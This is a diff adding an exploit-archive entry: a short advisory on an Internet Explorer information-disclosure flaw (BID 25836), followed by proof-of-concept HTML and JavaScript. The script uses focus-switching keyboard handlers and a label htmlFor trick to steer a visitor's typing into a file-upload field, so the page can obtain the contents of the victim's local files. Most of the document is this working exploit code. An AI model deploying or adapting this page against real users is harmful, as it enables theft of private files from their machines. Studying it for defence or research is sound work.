@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/25836/info
+
+Microsoft Internet Explorer is prone to an information-disclosure vulnerability that allows attackers to gain access to the contents of arbitrary files.
+
+This issue stems from a design error resulting from the improper handling of form fields.
+
+This issue is similar to the one described in BID 24725 (Mozilla Firefox OnKeyDown Event File Upload Vulnerability). 
+
+# based upon Hong's exploit:
+# http://sla.ckers.org/forum/read.php?3,13142
+
+<script>
+
+function Clear() {
+     document.getElementById("label1").htmlFor="file1";
+     document.getElementById("text1").focus();
+}
+
+function Down() {
+     document.getElementById("file1").focus();
+}
+
+</script>
+
+<input type="file" id="file1" name="file1" onkeydown="Clear()" onkeyup="Clear()" />
+<label id="label1" name="label1"></label>
+<br />
+<textarea name="text1" id="text1" onkeydown="Down()">
+&lt;/textarea&gt;
